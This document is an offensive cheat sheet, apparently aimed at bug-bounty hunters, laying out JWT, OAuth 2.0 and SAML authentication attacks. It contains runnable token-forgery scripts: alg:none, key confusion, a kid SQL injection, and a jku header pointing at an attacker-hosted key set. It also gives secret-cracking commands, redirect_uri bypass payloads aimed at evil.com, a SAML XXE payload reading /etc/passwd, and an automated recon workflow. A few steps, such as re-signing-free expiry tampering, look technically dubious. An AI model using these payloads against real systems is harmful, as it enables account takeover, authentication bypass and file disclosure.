# DEVIL JWT & OAUTH ANNIHILATION v777

## ══════════════════════════════════════
## JWT ATTACKS — COMPLETE ARSENAL
## ══════════════════════════════════════

### Attack 1: alg:none — No Signature Required
```bash
# Decode header.payload, set alg:none, strip signature
python3 -c "
import base64, json
header = json.dumps({'alg':'none','typ':'JWT'}).encode()
payload = json.dumps({'sub':'admin','role':'admin','iat':9999999999}).encode()
h = base64.urlsafe_b64encode(header).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
print(f'{h}.{p}.')
"
```

### Attack 2: RS256 → HS256 Confusion
```bash
# Get server's RSA public key, sign with HMAC using it as secret
python3 -c "
import jwt, requests
# Grab public key from /.well-known/jwks.json or /api/auth/keys
pub = open('pub.pem','rb').read()
token = jwt.encode({'sub':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)
"
# Test: curl -H 'Authorization: Bearer <token>' https://target.com/api/admin
```

### Attack 3: kid SQL Injection
```bash
# kid in header controls which key to use — inject SQL
# Craft header: {"kid":"' UNION SELECT 'secret'-- -","alg":"HS256"}
python3 -c "
import base64, json, hmac, hashlib
header = {'kid':\"' UNION SELECT 'deadbeef'-- -\",'alg':'HS256','typ':'JWT'}
payload = {'sub':'admin','role':'superadmin'}
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
secret = b'deadbeef'
sig = hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f'{h}.{p}.{s}')
"
```

### Attack 4: kid Path Traversal → RCE
```bash
# kid: ../../dev/null — sign with empty string
python3 -c "
import jwt
# kid points to /dev/null → empty file → empty secret
token = jwt.encode({'sub':'admin'}, '', algorithm='HS256',
    headers={'kid':'../../../../../../dev/null'})
print(token)
"
```

### Attack 5: jku/x5u SSRF Header Injection
```bash
# Host a malicious JWKS on attacker server, point jku to it
# 1. Generate RSA keypair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# 2. Build JWKS JSON from public key → serve on http://attacker.com/jwks.json

# 3. Forge JWT with jku pointing to attacker server
python3 -c "
import jwt, json
from cryptography.hazmat.primitives import serialization
priv = open('attacker.pem','rb').read()
token = jwt.encode({'sub':'admin','role':'admin'}, priv, algorithm='RS256',
    headers={'jku':'https://ATTACKER.COM/jwks.json','kid':'1337'})
print(token)
"
```

### Attack 6: Brute-force Weak Secret
```bash
hashcat -a 0 -m 16500 target.jwt /usr/share/wordlists/rockyou.txt
# OR
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
# OR use jwt-tool
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### Attack 7: JWT Expiry Not Validated
```bash
# Take expired token, just replay — many servers skip exp check
python3 -c "
import base64, json
# Decode existing token, change exp to 9999999999, keep same signature
token = 'PASTE_EXPIRED_JWT_HERE'
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
payload['exp'] = 9999999999
new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'{parts[0]}.{new_p}.{parts[2]}')
"
```

### jwt-tool Full Scan
```bash
pip3 install jwt_tool --break-system-packages -q
jwt_tool TARGET_JWT -t https://target.com/api/me -rh 'Authorization: Bearer JWT' \
  -M pb   # playbook scan — tries all attacks
jwt_tool TARGET_JWT -X a  # alg:none
jwt_tool TARGET_JWT -X s  # self-signed
jwt_tool TARGET_JWT -X k  # key confusion
jwt_tool TARGET_JWT -I -pc role -pv admin  # inject claim
```

---

## ══════════════════════════════════════
## OAUTH 2.0 ATTACKS
## ══════════════════════════════════════

### Attack 1: state CSRF — Account Takeover
```
1. Attacker starts OAuth flow on target site (Google/GitHub login)
2. Capture authorization URL: https://target.com/oauth/callback?code=XXX&state=MISSING
3. Drop state param or use predictable value
4. Trick victim into clicking crafted URL
5. Victim's account linked to attacker's OAuth identity = ATO

PoC:
<img src="https://target.com/oauth/callback?code=ATTACKER_CODE&state=">
```

### Attack 2: redirect_uri Bypass Techniques
```
# Open redirect → full takeover
https://target.com/oauth/authorize?client_id=X&redirect_uri=https://target.com/logout?next=https://evil.com&response_type=token

# Subdomain takeover first, then:
redirect_uri=https://evil.target.com/steal

# Path traversal in redirect_uri:
redirect_uri=https://target.com/oauth/callback/../../../steal

# Query param injection:
redirect_uri=https://target.com/callback?x=https://evil.com

# Fragment-based:
redirect_uri=https://target.com/callback#https://evil.com

# Regex bypass — target.com is whitelisted:
redirect_uri=https://target.com.evil.com
redirect_uri=https://targetXcom.evil.com
redirect_uri=https://target.com%252F@evil.com
```

### Attack 3: Implicit Flow Token Theft
```
1. If response_type=token — access token in URL fragment
2. Find any XSS on target.com → steal fragment
3. Use Referrer header leakage — if target redirects, Referer leaks token
4. If postMessage used → hijack with open iframe
```

### Attack 4: Authorization Code Interception
```bash
# Code replay — try reusing auth code (some servers don't invalidate)
# PKCE bypass — if PKCE not enforced
curl "https://target.com/oauth/token" \
  -d "grant_type=authorization_code&code=INTERCEPTED_CODE&redirect_uri=https://target.com/callback&client_id=X"
```

### Attack 5: Account Linking Takeover
```
1. Attacker has account on target.com (email: attacker@evil.com)
2. Victim has account (email: victim@gmail.com)
3. Attacker links their Google OAuth (victim@gmail.com) to attacker account
4. No verification that attacker owns victim@gmail.com = ATO
```

---

## ══════════════════════════════════════
## SAML ATTACKS
## ══════════════════════════════════════

### Attack 1: XML Signature Wrapping (XSW)
```python
# Move signed assertion into extension, inject unsigned malicious assertion
# Tools:
pip3 install saml-raider --break-system-packages -q

# Intercept SAML Response in Burp
# Send to SAML Raider extension
# Apply XSW attack types 1-8
# Forward with admin NameID
```

### Attack 2: SAML XXE
```xml
<!-- Inject into SAML assertion -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:Assertion>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Assertion>
</samlp:Response>
```

### Attack 3: Signature Exclusion
```
# Some parsers validate signature only if present
# Remove XMLSignature block entirely from SAML response
# Change NameID to admin@target.com
# If server accepts unsigned = auth bypass
```

---

## ══════════════════════════════════════
## AUTOMATION WORKFLOW
## ══════════════════════════════════════

```bash
# Full JWT+OAuth recon on target
TARGET="https://target.com"

# 1. Find JWT endpoints
curl -s "$TARGET/api/me" -H "Authorization: Bearer invalid" -v 2>&1 | grep -i jwt

# 2. Extract JWTs from JS files
katana -u $TARGET -jc | grep -oE 'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*' | sort -u > jwts.txt

# 3. Decode and analyze
cat jwts.txt | while read jwt; do
  python3 -c "import base64,json; p='$jwt'.split('.')[1]; print(json.loads(base64.urlsafe_b64decode(p+'==')))"
done

# 4. Try all JWT attacks with jwt-tool
jwt_tool $(head -1 jwts.txt) -t $TARGET -M pb -rh "Authorization: Bearer JWT"

# 5. Check JWKS endpoint
curl -s $TARGET/.well-known/jwks.json | python3 -m json.tool

# 6. Find OAuth endpoints
curl -s $TARGET/.well-known/openid-configuration | python3 -m json.tool
```

---
**IMPACT TARGET: Critical ATO | Bounty range: $2,000–$100,000**
